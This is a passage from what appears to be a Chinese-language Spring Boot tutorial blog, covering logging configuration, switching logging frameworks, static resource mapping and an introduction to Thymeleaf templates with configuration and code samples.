class="line"># 可以指定完整的路径；</span><br><span class="line">#logging.file=G:/springboot.log</span><br><span class="line"></span><br><span class="line"># 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用 spring.log 作为默认文件</span><br><span class="line">logging.path=/spring/log</span><br><span class="line"></span><br><span class="line">#  在控制台输出的日志的格式</span><br><span class="line">logging.pattern.console=%d&#123;yyyy-MM-dd&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</span><br><span class="line"># 指定文件中日志输出的格式</span><br><span class="line">logging.pattern.file=%d&#123;yyyy-MM-dd&#125; === [%thread] === %-5level === %logger&#123;50&#125; ==== %msg%n</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>logging.file</th><th>logging.path</th><th>Example</th><th>Description</th></tr></thead><tbody><tr><td>(none)</td><td>(none)</td><td></td><td>只在控制台输出</td></tr><tr><td>指定文件名</td><td>(none)</td><td>my.log</td><td>输出日志到my.log文件</td></tr><tr><td>(none)</td><td>指定目录</td><td>/var/log</td><td>输出到指定目录的 spring.log 文件中</td></tr></tbody></table></div><h3 id="2、指定配置"><a href="#2、指定配置" class="headerlink" title="2、指定配置"></a>2、指定配置</h3><p>给类路径下放上每个日志框架自己的配置文件即可；SpringBoot就不使用他默认配置的了</p><div class="table-container"><table><thead><tr><th>Logging System</th><th>Customization</th></tr></thead><tbody><tr><td>Logback</td><td><code>logback-spring.xml</code>, <code>logback-spring.groovy</code>, <code>logback.xml</code> or <code>logback.groovy</code></td></tr><tr><td>Log4j2</td><td><code>log4j2-spring.xml</code> or <code>log4j2.xml</code></td></tr><tr><td>JDK (Java Util Logging)</td><td><code>logging.properties</code></td></tr></tbody></table></div><p>logback.xml：直接就被日志框架识别了；</p><p><strong>logback-spring.xml</strong>：日志框架就不直接加载日志的配置项，由SpringBoot解析日志配置，可以使用SpringBoot的高级Profile功能</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"staging"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- configuration to be enabled when the "staging" profile is active --&gt;</span></span><br><span class="line">  可以指定某段配置只在某个环境下生效</span><br><span class="line"><span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"stdout"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        日志输出格式：</span></span><br><span class="line"><span class="comment">%d表示日期时间，</span></span><br><span class="line"><span class="comment">%thread表示线程名，</span></span><br><span class="line"><span class="comment">%-5level：级别从左显示5个字符宽度</span></span><br><span class="line"><span class="comment">%logger&#123;50&#125; 表示logger名字最长50个字符，否则按照句点分割。 </span></span><br><span class="line"><span class="comment">%msg：日志消息，</span></span><br><span class="line"><span class="comment">%n是换行符</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ----&gt; [%thread] ---&gt; %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"!dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ==== [%thread] ==== %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果使用logback.xml作为日志配置文件，还要使用profile功能，会有以下错误</p><p> <code>no applicable action for [springProfile]</code></p><h2 id="5、切换日志框架"><a href="#5、切换日志框架" class="headerlink" title="5、切换日志框架"></a>5、切换日志框架</h2><p>可以按照slf4j的日志适配图，进行相关的切换；</p><p>slf4j+log4j的方式；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切换为log4j2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="四、Web开发"><a href="#四、Web开发" class="headerlink" title="四、Web开发"></a>四、Web开发</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>使用SpringBoot；</p><p><strong>1）、创建SpringBoot应用，选中我们需要的模块；</strong></p><p><strong>2）、SpringBoot已经默认将这些场景配置好了，只需要在配置文件中指定少量配置就可以运行起来</strong></p><p><strong>3）、自己编写业务代码；</strong></p><p><strong>自动配置原理？</strong></p><p>这个场景SpringBoot帮我们配置了什么？能不能修改？能修改哪些配置？能不能扩展？xxx</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxxAutoConfiguration：帮我们给容器中自动配置组件；</span><br><span class="line"><span class="symbol">xxxxProperties:</span>配置类来封装配置文件的内容；</span><br></pre></td></tr></table></figure><h2 id="2、SpringBoot对静态资源的映射规则；"><a href="#2、SpringBoot对静态资源的映射规则；" class="headerlink" title="2、SpringBoot对静态资源的映射规则；"></a>2、SpringBoot对静态资源的映射规则；</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.resources"</span>, ignoreUnknownFields = <span class="keyword">false</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceProperties</span> <span class="keyword">implements</span> <span class="title">ResourceLoaderAware</span> </span>&#123;</span><br><span class="line">  <span class="comment">//可以设置和静态资源有关的参数，缓存时间等</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">WebMvcAuotConfiguration：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.resourceProperties.isAddMappings()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Default resource handling disabled"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Integer cachePeriod = <span class="keyword">this</span>.resourceProperties.getCachePeriod();</span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(<span class="string">"/webjars/**"</span>)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(<span class="string">"/webjars/**"</span>)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="string">"classpath:/META-INF/resources/webjars/"</span>)</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line">String staticPathPattern = <span class="keyword">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class="line">         <span class="comment">//静态资源文件夹映射</span></span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(staticPathPattern)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="keyword">this</span>.resourceProperties.getStaticLocations())</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//配置欢迎页映射</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> WelcomePageHandlerMapping <span class="title">welcomePageHandlerMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ResourceProperties resourceProperties)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WelcomePageHandlerMapping(resourceProperties.getWelcomePage(),</span><br><span class="line"><span class="keyword">this</span>.mvcProperties.getStaticPathPattern());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//配置喜欢的图标</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(value = <span class="string">"spring.mvc.favicon.enabled"</span>, matchIfMissing = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FaviconConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ResourceProperties resourceProperties;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FaviconConfiguration</span><span class="params">(ResourceProperties resourceProperties)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.resourceProperties = resourceProperties;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> SimpleUrlHandlerMapping <span class="title">faviconHandlerMapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SimpleUrlHandlerMapping mapping = <span class="keyword">new</span> SimpleUrlHandlerMapping();</span><br><span class="line">mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + <span class="number">1</span>);</span><br><span class="line">             <span class="comment">//所有  **/favicon.ico </span></span><br><span class="line">mapping.setUrlMap(Collections.singletonMap(<span class="string">"**/favicon.ico"</span>,</span><br><span class="line">faviconRequestHandler()));</span><br><span class="line"><span class="keyword">return</span> mapping;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ResourceHttpRequestHandler <span class="title">faviconRequestHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ResourceHttpRequestHandler requestHandler = <span class="keyword">new</span> ResourceHttpRequestHandler();</span><br><span class="line">requestHandler</span><br><span class="line">.setLocations(<span class="keyword">this</span>.resourceProperties.getFaviconLocations());</span><br><span class="line"><span class="keyword">return</span> requestHandler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==1）、所有 /webjars/** ，都去 classpath:/META-INF/resources/webjars/ 找资源；==</p><p>​    webjars：以jar包的方式引入静态资源；</p><p><a href="http://www.webjars.org/" target="_blank" rel="noopener">http://www.webjars.org/</a></p><p><img src="images/搜狗截图20180203181751.png" alt=""></p><p>localhost:8080/webjars/jquery/3.3.1/jquery.js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入jquery-webjar--&gt;</span>在访问的时候只需要写webjars下面资源的名称即可</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>==2）、”/**” 访问当前项目的任何资源，都去（静态资源的文件夹）找映射==</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"classpath:/META-INF/resources/"</span>, </span><br><span class="line"><span class="string">"classpath:/resources/"</span>,</span><br><span class="line"><span class="string">"classpath:/static/"</span>, </span><br><span class="line"><span class="string">"classpath:/public/"</span> </span><br><span class="line"><span class="string">"/"</span>：当前项目的根路径</span><br></pre></td></tr></table></figure><p>localhost:8080/abc ===  去静态资源文件夹里面找abc</p><p>==3）、欢迎页； 静态资源文件夹下的所有index.html页面；被”/**”映射；==</p><p>​    localhost:8080/   找index页面</p><p>==4）、所有的 **/favicon.ico  都是在静态资源文件下找；==</p><h2 id="3、模板引擎"><a href="#3、模板引擎" class="headerlink" title="3、模板引擎"></a>3、模板引擎</h2><p>JSP、Velocity、Freemarker、Thymeleaf</p><p><img src="images/template-engine.png" alt=""></p><p>SpringBoot推荐的Thymeleaf；</p><p>语法更简单，功能更强大；</p><h3 id="1、引入thymeleaf；"><a href="#1、引入thymeleaf；" class="headerlink" title="1、引入thymeleaf；"></a>1、引入thymeleaf；</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          2.1.6</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">切换thymeleaf版本</span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf.version</span>&gt;</span>3.0.9.RELEASE<span class="tag">&lt;/<span class="name">thymeleaf.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 布局功能的支持程序  thymeleaf3主程序  layout2以上版本 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- thymeleaf2   layout1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、Thymeleaf使用"><a href="#2、Thymeleaf使用" class="headerlink" title="2、Thymeleaf使用"></a>2、Thymeleaf使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.thymeleaf"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThymeleafProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Charset DEFAULT_ENCODING = Charset.forName(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_PREFIX = <span class="string">"classpath:/templates/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_SUFFIX = <span class="string">".html"</span>;</span><br><span class="line">  <span class="comment">//</span></span><br></pre></td></tr></table></figure><p>只要我们把HTML页面放在classpath:/templates/，thymeleaf就能自动渲染；</p><p>使用：</p><p>1、导入thymeleaf的名称空间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、使用thymeleaf语法；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>成功！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--th:text 将div里面的文本内容设置为 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">"$&#123;hello&#125;"</span>&gt;</span>这是显示欢迎信息<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3、语法规则"><a href="#3、语法规则" class="headerlink" title="3、语法规则"></a>3、语法规则</h3><p>1）、th:text；改变当前元素里面的文本内容；</p><p>​    th：任意html属性；来替换原生属性的值</p><p><img src="images/2018-02-04_123955.png" alt=""></p><p>2）、表达式？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Simple expressions:（表达式语法）</span><br><span class="line">    Variable Expressions: $&#123;...&#125;：获取变量值；OGNL；</span><br><span class="line">    1）、获取对象的属性、调用方法</span><br><span class="line">    2）、使用内置的基本对象：</span><br><span class="line">    #ctx : the context object.</span><br><span class="line">    #vars: the context variables.</span><br><span class="line">                #locale : the context locale.</span><br><span class="line">                #request : (only in Web Contexts) the HttpServletRequest object.</span><br><span class="line">                #response : (only in Web Contexts) the HttpServletResponse object.</span><br><span class="line">                #session : (only in Web Contexts) the HttpSession object.</span><br><span class="line">                #servletContext : (only in Web Contexts) the ServletContext object.</span><br><span class="line">                </span><br><span class="line">                $&#123;session.foo&#125;</span><br><span class="line">            3）、内置的一些工具对象：</span><br><span class="line">#execInfo : information about the template being processed.</span><br><span class="line">#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #&#123;…&#125; syntax.</span><br><span class="line">#uris : methods for escaping parts of URLs/URIs</span><br><span class="line">#conversions : methods for executing the configured conversion service (if any).</span><br><span class="line">#dates : methods for java.util.Date objects: formatting, component extraction, etc.</span><br><span class="line">#calendars : analogous to #dates , but for java.util.Calendar objects.</span><br><span class="line">#numbers : methods for formatting numeric objects.</span><br><span class="line">#strings : methods for String objects: contains, startsWith, prepending/appending, etc.</span><br><span class="line">#objects : methods for objects in general.</span><br><span class="line">#bools : methods for boolean evaluation.</span><br><span class="line">#arrays : methods for arrays.</span><br><span class="line">#lists : methods for lists.</span><br><span class="line">#sets : methods for sets.</span><br><span class="line">#maps : methods for maps.</span><br><span class="line">#aggregates : methods for creating aggregates on arrays or collections.</span><br><span class="line">#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).</span><br><span class="line"></span><br><span class="line">    Selection Variable Expressions: *&#123;...&#125;：选择表达式：和$&#123;&#125;在功能上是一样；</span><br><span class="line">    补充：配合 th:object=&quot;$&#123;session.user&#125;：</span><br><span class="line">   &lt;div th:object=&quot;$&#123;session.user&#125;&quot;&gt;</span><br><span class="line">    &lt;p&gt;Name: &lt;span th:text=&quot;*&#123;firstName&#125;&quot;&gt;Sebastian&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Surname: &lt;span 